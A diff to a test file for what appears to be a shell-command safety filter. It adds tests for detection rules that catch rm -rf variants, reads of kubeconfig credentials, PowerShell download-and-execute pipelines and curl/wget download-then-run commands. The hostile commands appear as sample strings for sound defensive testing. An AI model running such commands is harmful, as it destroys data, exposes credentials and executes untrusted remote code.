@@ -169,12 +169,37 @@ test('sensitive-ssh: 命中 ~/.ssh / id_rsa / .pem', () => {
   assert.ok(!p.test('echo ssh-agent'));
 });
 
-test('rm-rf: 命中 rm -rf / rm -fr，不误伤 rm 单旗标', () => {
+test('rm-rf: 命中 rm -rf / rm -fr / rm -r -f，不误伤 rm 单旗标', () => {
   const p = rule('rm-rf').pattern;
   assert.ok(p.test('rm -rf /tmp/x'));
   assert.ok(p.test('rm -fr /tmp/x'));
+  assert.ok(p.test('rm -r -f /tmp/x'));
+  assert.ok(p.test('rm -f -r /tmp/x'));
   assert.ok(!p.test('rm -r /tmp/x'));
   assert.ok(!p.test('rm /tmp/x'));
+});
+
+test('sensitive-kube: 命中 ~/.kube / kubeconfig', () => {
+  const p = rule('sensitive-kube').pattern;
+  assert.ok(p.test('cat ~/.kube/config'));
+  assert.ok(p.test('kubectl --kubeconfig /etc/kubernetes/admin.conf'));
+  assert.ok(!p.test('kubectl get pods'));
+});
+
+test('pwsh-web-exec: 命中 Invoke-WebRequest | iex，不误报普通下载', () => {
+  const p = rule('pwsh-web-exec').pattern;
+  assert.ok(p.test('Invoke-WebRequest http://x/a.ps1 | iex'));
+  assert.ok(p.test('iwr http://x/a.ps1 | Invoke-Expression'));
+  assert.ok(p.test('(New-Object Net.WebClient).DownloadString("http://x") | iex'));
+  assert.ok(!p.test('Invoke-WebRequest http://x -OutFile a.ps1'));
+});
+
+test('download-exec: 命中 curl -o file && bash file，不误报普通下载', () => {
+  const p = rule('download-exec').pattern;
+  assert.ok(p.test('curl -o /tmp/x.sh https://x && bash /tmp/x.sh'));
+  assert.ok(p.test('wget https://x -O /tmp/x.sh; sh /tmp/x.sh'));
+  assert.ok(!p.test('curl -o /tmp/x.sh https://x'));
+  assert.ok(!p.test('cat file && bash script.sh'));
 });
 
 test('sudo: 命中 sudo，不误伤 sudoku', () => {
